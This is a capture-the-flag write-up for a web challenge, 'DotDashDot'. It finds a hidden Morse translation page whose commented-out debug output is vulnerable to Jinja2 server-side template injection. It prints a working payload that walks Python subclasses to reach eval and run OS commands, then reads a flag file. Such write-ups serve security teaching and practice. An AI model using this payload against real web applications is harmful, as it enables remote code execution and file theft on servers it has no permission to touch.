# DotDashDot 

- Category: Web
- Difficulty: Extreme

Challenge text:
```
An ancient relic of the past... what's it doing here?
http://dotdashdot.d.lagncra.sh 
```

## Solving the challenge
Firstly, lets navigate to the URL provided.
On visiting the page, we see this:  
![image](https://user-images.githubusercontent.com/58442255/233332323-559e150e-2441-4da9-9e47-6af19f260585.png)

Let's look for clues in the website.  
In the source, we see this comment:
```html
<!-- TODO: Repair this page <p>MORSE: <a href="/translate">UP</a></p> -->
```

This shows that there is a page `/translate` in the site. Let us visit http://dotdashdot.d.lagncra.sh/translate.

At /translate, we see this page to convert text into morse:  
![image](https://user-images.githubusercontent.com/58442255/233391274-58c1def0-ecb3-4bfd-a815-898589108c2a.png)  
After translation, we are presented with the morse code form of the text. If we decode the morse, we get back the original text.

If we try a payload like `{{7*7}}`, we notice that the morse code is still `77`(omitting characters that cannot be represented in morse).  
However, if we view the source, we can see a debug section that was supposed to be removed:
```html
 <!-- <div> TODO: Remove debug information
                    <h2>Debug Info</h2>
                    <p>Input: 49</p>
                </div> -->
```

It appears that the debug field is vulnerable to Server-Side Template Injection (SSTI).

We can use a payload to gain Python RCE into the system:
```
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {% for b in c.__init__.__globals__.values() %}
    {% if b.__class__ == {}.__class__ %}
      {% if 'eval' in b.keys() %}
        {{ b['eval']('__import__("os").listdir()') }}
      {% endif %}
    {% endif %}
    {% endfor %}
  {% endif %}
{% endfor %}
```
This iterates through the subclasses of the base class (`__base__`), and finds `eval` in `__globals__`, and lists the current directory.  

The output shows:
![image](https://user-images.githubusercontent.com/58442255/233395728-92c6bf27-82c8-478c-8344-ad343ddd0e3f.png)

It appears that we are in the root directory.

After searching around for quite some time, I found the flag in `/www/flag.txt`:
```python
open("/www/flag.txt").read()
```

And we got the flag!
![image](https://user-images.githubusercontent.com/58442255/233396291-97908adf-fc4e-4480-ba9a-c1cb53143fc6.png)


`LNC2023{T3mpl4t35_4r3_c00L_bUt_d4nG3r0u5_776843}`

